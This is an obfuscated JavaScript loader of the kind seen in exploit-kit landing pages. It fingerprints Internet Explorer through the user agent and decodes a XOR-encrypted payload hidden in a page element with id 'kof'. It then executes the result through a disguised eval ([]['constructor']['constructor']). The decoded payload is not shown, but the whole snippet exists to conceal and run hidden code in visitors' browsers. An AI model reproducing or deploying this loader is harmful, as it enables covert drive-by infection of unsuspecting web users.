jiexl = (+[window.sidebar]);
yntiwhs = ["rv:11", "MSIE", ];
for (top = jiexl; top < yntiwhs.length; top++) {
  if (navigator.userAgent.indexOf(yntiwhs[top]) > jiexl) {
    bvbj = yntiwhs.length - top;
    break;
  }
}
if (navigator.userAgent.indexOf("MSIE10") > jiexl) {
  bvbj++;
}
lvlss = bvbj - 1;
yigq = "jJGhS2CqNcxJsnhm";
jcjy = document.getElementById("kof").innerHTML;
kngk = jiexl;
jnb = jiexl;
xjl = "";
for (top = jiexl; top < jcjy.length; top += lvlss) {
  eg = jcjy.charCodeAt(top);
  if (eg >= 97 && eg <= 122) {
    if (kngk % bvbj) {
      xjl += String.fromCharCode(((uvmxk + eg - 97) ^ yigq.charCodeAt(jnb % yigq.length)) % 255);
      jnb++;
    } else {
      uvmxk = (eg - 97) * 26;
    }
    kngk++;
  }
}[]["constructor"]["constructor"](xjl)();
